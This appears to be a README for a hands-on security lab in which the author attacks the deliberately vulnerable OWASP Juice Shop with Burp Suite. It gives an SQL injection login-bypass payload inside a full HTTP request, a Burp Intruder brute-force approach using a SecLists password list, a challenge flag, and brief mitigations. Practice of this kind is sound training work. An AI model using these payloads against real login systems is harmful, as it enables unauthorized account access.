# OWASP-Top-10

This project is a hands-on deep dive into common web application vulnerabilities from the [OWASP Top 10](https://owasp.org/www-project-top-ten/), tested against the intentionally vulnerable [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/). All testing was performed using [Burp Suite Community Edition](https://portswigger.net/burp) as the main interception, manipulation, and automation tool.

It includes detailed exploitation of vulnerabilities like **SQL Injection** and **Brute-Force Attacks**, along with request payloads, screenshots, and takeaways.

## Vulnerabilities Covered

### 1. SQL Injection â€“ Admin Login Bypass

- **Payload used:**
  ```sql
  ' OR 1=1--

POST /rest/user/login HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json

{
  "email": "' OR 1=1--",
  "password": "irrelevant"
}
Result: Gained unauthorized access to the admin panel without credentials.

Flag earned: 32a5e0f21372bcc1000a6088b93b458e41f0e02a

Brute-Force Attack â€“ Admin Password
Context: After logging in via SQLi, the real password remained unknown.

Approach:

Found the admin email in a product review.

Intercepted login request and configured Burp Intruder.

Loaded payloads from:

swift
Copy
Edit
/usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt
Observed responses for 200 OK instead of 401 Unauthorized.

How These Issues Should Be Mitigated
SQL Injection:

Use prepared statements or parameterized queries

Sanitize and validate all input

Brute Force:

Rate-limit login attempts

Lock accounts after multiple failed logins

Use MFA and alerting mechanisms
